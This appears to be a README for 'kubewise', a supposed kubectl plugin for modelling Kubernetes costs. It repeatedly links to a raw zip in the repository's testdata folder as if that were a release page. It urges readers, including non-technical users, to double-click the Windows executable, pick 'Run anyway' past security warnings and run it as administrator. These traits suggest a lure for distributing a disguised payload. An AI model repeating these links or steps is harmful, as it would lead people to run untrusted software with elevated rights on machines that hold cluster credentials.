# 📦 kubewise - Model Kubernetes costs before changes

[![Download kubewise](https://img.shields.io/badge/Download%20kubewise-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip)

## 🧭 What kubewise does

kubewise helps you see the cost impact of planned Kubernetes changes before you make them. It takes a snapshot of your cluster, then shows how changes may affect cost and risk.

Use it to compare plans like:

- right-sizing workloads
- moving pods to spot instances
- consolidating nodes
- testing cost changes before rollout

It works as a kubectl plugin through krew, so it fits into a common Kubernetes workflow.

## 💻 What you need

Before you install kubewise, make sure you have:

- a Windows computer
- internet access
- permission to download files from GitHub
- kubectl installed
- krew installed if you want to use the kubectl plugin flow
- access to a Kubernetes cluster if you plan to snapshot live data

If you only want to open the app and explore local snapshots, you still need a Windows system and the release file from GitHub.

## 📥 Download kubewise

Visit this page to download:

https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip

On that page:

1. open the latest release
2. find the Windows file
3. download the file to your computer
4. save it in a folder you can find again, such as Downloads

If the release contains a zip file, extract it first before you run the app.

## 🛠️ Install on Windows

After the file finishes downloading:

1. open File Explorer
2. go to the folder with the download
3. if the file is zipped, right-click it and choose Extract All
4. open the extracted folder
5. look for the kubewise file or installer
6. double-click the file to run it

If Windows shows a security prompt:

1. choose More info
2. choose Run anyway if you trust the source
3. wait for the app to open

If the release includes a command-line file, keep it in a folder you can reach from Command Prompt or PowerShell.

## ⚙️ Use with krew

kubewise also works as a kubectl plugin through krew.

If you already use krew:

1. open PowerShell
2. make sure kubectl works on your machine
3. install the kubewise plugin from the krew index, if the release provides that path
4. run it from kubectl like other plugins

A common plugin flow looks like this:

1. open a terminal
2. run a kubectl command
3. use the kubewise command from the plugin name
4. connect it to your cluster snapshot or plan file

If you do not use krew, you can still use the release download from GitHub.

## 🚀 First run

When kubewise opens for the first time, it may ask for:

- a cluster context
- a snapshot target
- a file location for saved plans
- access to Kubernetes resources

A simple first run looks like this:

1. open kubewise
2. choose your cluster
3. create a snapshot
4. review the current cost view
5. try one change at a time
6. compare the cost result before and after

Start with one small change so the results are easy to read.

## 📊 What you can test

kubewise is useful when you want to compare the effect of a change before you apply it.

Common checks include:

- right-sizing pods that use too much CPU or memory
- moving workloads from on-demand nodes to spot instances
- combining small nodes into fewer larger nodes
- reviewing cost shifts after a planned rollout
- checking the risk of a change before approval

It gives you a way to look at both cost and risk in one place.

## 🧩 How the workflow fits together

A simple kubewise workflow is:

1. snapshot your cluster
2. model a change
3. compare the expected cost
4. review the risk impact
5. apply the change if the result looks good

This helps you avoid trial and error in the live cluster.

## 🗂️ Example use cases

Use kubewise when you want to:

- prepare a cost review for a Kubernetes team
- check whether spot migration is worth it
- see if node consolidation lowers spend
- test a new sizing plan before deployment
- support finops work with cluster data
- share a clear view of cost impact with non-technical people

## 🔍 Tips for best results

- use a fresh snapshot
- compare one change at a time
- keep cluster names and node groups clear
- review both cost and risk, not cost alone
- save your plan files so you can compare later
- use the same context each time when possible

## 🧪 Common problems

If kubewise does not open:

1. check that the download finished
2. make sure you extracted the zip file
3. right-click the file and try Run as administrator
4. confirm Windows did not block the file

If kubectl or krew does not work:

1. open PowerShell
2. type `kubectl version`
3. confirm kubectl is installed
4. confirm your cluster context is set
5. check that krew is on your PATH if you use the plugin flow

If the app cannot read cluster data:

1. confirm you are signed in to the right cluster
2. check your access rights
3. try again with a different context
4. use a snapshot created from a cluster you can reach

## 📁 File names you may see

The release page may include files such as:

- a Windows zip package
- a Windows executable
- a plugin package for krew
- release notes
- checksum files

Choose the Windows file that matches the way you want to use kubewise.

## 🔐 Safety and access

kubewise works with cluster data, so it may need read access to Kubernetes resources. Use an account that can view the parts of the cluster you want to model. Keep the download from the official GitHub release page so you know where the file came from.

## 🖥️ Windows setup path

If you want the simplest path on Windows:

1. go to the release page
2. download the Windows file
3. extract it if needed
4. open the app
5. create a snapshot
6. review the cost plan
7. keep the file in a known folder for later use

## 📌 Where to get updates

To get the latest version, check the releases page again:

https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip

Look for newer release notes, newer Windows files, and any changes to the plugin install steps

## 🧭 Typical workflow for a non-technical user

If you are new to this tool, use this path:

1. download kubewise from the releases page
2. open the file on Windows
3. connect it to your cluster or load a snapshot
4. choose one possible change
5. review the cost result
6. review the risk result
7. save the plan for later review